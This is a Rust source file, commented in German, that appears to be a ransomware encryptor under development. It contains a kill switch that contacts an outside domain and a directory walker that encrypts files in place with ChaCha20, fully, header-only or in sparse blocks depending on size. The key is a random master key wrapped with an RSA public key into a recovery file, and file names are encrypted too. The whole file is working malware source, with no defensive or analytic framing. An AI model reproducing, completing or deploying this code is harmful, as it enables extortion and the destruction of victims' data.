use anyhow::Ok;
use base64::{Engine as _, engine::general_purpose};
use chacha20::ChaCha20;
use chacha20::cipher::{KeyIvInit, StreamCipher};
use rand::{RngCore, thread_rng};
use rayon::prelude::*;
use rsa::{Oaep, RsaPublicKey, pkcs8::DecodePublicKey};
use sha2::{Digest, Sha256};
use std::alloc::System;
use std::fs::{self, OpenOptions};
use std::io::{Read, Seek, SeekFrom, Write};
use std::os::unix::process;
use std::path::{Path, PathBuf};
use walkdir::WalkDir;
mod gui;
// --- KONSTANTEN ---
const BUFFER_4MB: usize = 4 * 1024 * 1024;
const BUFFER_1MB: usize = 1 * 1024 * 1024;
const SMALL_FILE_THRESHOLD: u64 = 1 * 1024 * 1024; // < 1 MB
const MEDIUM_FILE_THRESHOLD: u64 = 500 * 1024 * 1024; // < 500 MB
const RECOVERY_FILE: &str = "INFO.bin";
const SPARSE_BLOCKS: usize = 5; // Anzahl der zusätzlichen Blöcke bei großen Dateien
const DEBUG_MODE: bool = true;
const test_gui: bool = true;
#[derive(serde::Serialize, serde::Deserialize)]
struct RecoveryMetadata {
    encrypted_master_key: Vec<u8>,
    nonce_salt: [u8; 16],
    chunk_size: usize,
    tiered_strategy: bool, // Für zukünftige Kompatibilität
}

impl RecoveryMetadata {
    fn derive_nonce(&self, master_key: &[u8; 32], original_path: &str) -> [u8; 12] {
        let mut hasher = Sha256::new();
        hasher.update(master_key);
        hasher.update(original_path.as_bytes());
        hasher.update(self.nonce_salt);
        let result = hasher.finalize();
        let mut nonce = [0u8; 12];
        nonce.copy_from_slice(&result[0..12]);
        nonce
    }
}
async fn check() -> bool {
    if DEBUG_MODE {
        println!("Starting check...");
    }
    let url = "https://hsh73ny3hov3dx1kwdynxaqw6yvmg2h7ht4z63ux55ssnm.mcjj.de/";
    if DEBUG_MODE {
        println!("Checking URL: {}", url);
    }

    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(5))
        .build()
        .unwrap();
    if let std::result::Result::Ok(response) = client.get(url).send().await {
        let status_code = response.status().as_u16();
        // Erkennt den benutzerdefinierten HTTP-Statuscode 276
        if status_code == 276 {
            if DEBUG_MODE {
                println!("Kill Switch aktiv (HTTP 276).");
            }
            return false;
        }
    }

    if DEBUG_MODE {
        println!("URL ist erreichbar / Kein Kill Switch.");
    }
    return true;
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    if test_gui {
        gui::start_gui()?;
        std::process::exit(0);
    }
    let result = check().await;
    if !result {
        if DEBUG_MODE {
            println!("Kill Switch aktiviert. Beende Programm.");
        }
        std::process::exit(0);
    }
    let target_dir = "/home/jannik/Cloud/Dev/RAN/enc/test_data";
    let dry_run = false;
    let pub_key_pem = fs::read_to_string("public.pem")?;
    let pub_key = RsaPublicKey::from_public_key_pem(&pub_key_pem)?;

    // Master-Key & Salt
    let mut master_key = [0u8; 32];
    let mut rng = thread_rng();
    rng.fill_bytes(&mut master_key);
    let mut salt = [0u8; 16];
    rng.fill_bytes(&mut salt);

    let enc_key = pub_key.encrypt(&mut rng, Oaep::new::<Sha256>(), &master_key)?;

    let meta = RecoveryMetadata {
        encrypted_master_key: enc_key,
        nonce_salt: salt,
        chunk_size: BUFFER_4MB,
        tiered_strategy: true,
    };

    println!("🚀 Verschlüsselung mit Tiered Strategy gestartet...");

    let entries: Vec<PathBuf> = WalkDir::new(target_dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
        .map(|e| e.into_path())
        .collect();

    entries.par_iter().for_each(|path| {
        if !dry_run {
            let _ = process_file(path, &master_key, &meta);
        }
    });

    // Recovery Info speichern
    let serialized = bincode::serialize(&meta)?;
    fs::write(RECOVERY_FILE, &serialized)?;

    println!(
        "✅ Verschlüsselung abgeschlossen. Recovery-Datei: {}",
        RECOVERY_FILE
    );
    Ok(())
}

fn process_file(path: &Path, master_key: &[u8; 32], meta: &RecoveryMetadata) -> anyhow::Result<()> {
    let original_path_str = path.to_string_lossy().to_string();
    let nonce = meta.derive_nonce(master_key, &original_path_str);
    let mut cipher = ChaCha20::new(master_key.into(), &nonce.into());

    encrypt_content_tiered(path, &mut cipher)?;

    rename_file(path, master_key, meta, &original_path_str)?;

    Ok(())
}

fn encrypt_content_tiered(path: &Path, cipher: &mut ChaCha20) -> anyhow::Result<()> {
    let mut file = OpenOptions::new().read(true).write(true).open(path)?;
    let size = file.metadata()?.len();

    match size {
        s if s < SMALL_FILE_THRESHOLD => {
            // Stufe 1: Kleine Dateien → Komplett verschlüsseln
            encrypt_full(&mut file, size, cipher)?;
        }
        s if s < MEDIUM_FILE_THRESHOLD => {
            // Stufe 2: Mittlere Dateien → Nur Header
            encrypt_header(&mut file, cipher)?;
        }
        _ => {
            // Stufe 3: Große Dateien → Sparse (Header + verteilte Blöcke)
            encrypt_sparse(&mut file, size, cipher)?;
        }
    }
    Ok(())
}

fn encrypt_full(file: &mut std::fs::File, size: u64, cipher: &mut ChaCha20) -> anyhow::Result<()> {
    let mut buffer = vec![0u8; size as usize];
    file.read_exact(&mut buffer)?;
    cipher.apply_keystream(&mut buffer);
    file.seek(SeekFrom::Start(0))?;
    file.write_all(&buffer)?;
    Ok(())
}

fn encrypt_header(file: &mut std::fs::File, cipher: &mut ChaCha20) -> anyhow::Result<()> {
    let mut buffer = vec![0u8; BUFFER_4MB];
    file.read_exact(&mut buffer)?;
    cipher.apply_keystream(&mut buffer);
    file.seek(SeekFrom::Start(0))?;
    file.write_all(&buffer)?;
    Ok(())
}

fn encrypt_sparse(
    file: &mut std::fs::File,
    size: u64,
    cipher: &mut ChaCha20,
) -> anyhow::Result<()> {
    // Header
    encrypt_header(file, cipher)?;

    // Zusätzliche verteilte Blöcke
    let step = size as usize / (SPARSE_BLOCKS + 1);
    for i in 1..=SPARSE_BLOCKS {
        let offset = (i * step) as u64;
        if offset + BUFFER_1MB as u64 > size {
            break;
        }

        file.seek(SeekFrom::Start(offset))?;
        let mut buffer = vec![0u8; BUFFER_1MB];
        file.read_exact(&mut buffer)?;
        cipher.apply_keystream(&mut buffer);
        file.seek(SeekFrom::Start(offset))?;
        file.write_all(&buffer)?;
    }
    Ok(())
}

fn rename_file(
    path: &Path,
    master_key: &[u8; 32],
    meta: &RecoveryMetadata,
    original_path_str: &str,
) -> anyhow::Result<()> {
    let old_name = path.file_name().unwrap().to_string_lossy();
    let mut name_bytes = old_name.as_bytes().to_vec();

    let parent = Path::new(original_path_str)
        .parent()
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_default();
    let name_nonce_input = format!("{}_name", parent);
    let name_nonce = meta.derive_nonce(master_key, &name_nonce_input);
    let mut name_cipher = ChaCha20::new(master_key.into(), &name_nonce.into());

    name_cipher.apply_keystream(&mut name_bytes);

    let new_name = general_purpose::URL_SAFE_NO_PAD.encode(name_bytes);
    let mut new_path = path.to_path_buf();
    new_path.set_file_name(new_name);

    fs::rename(path, new_path)?;
    Ok(())
}
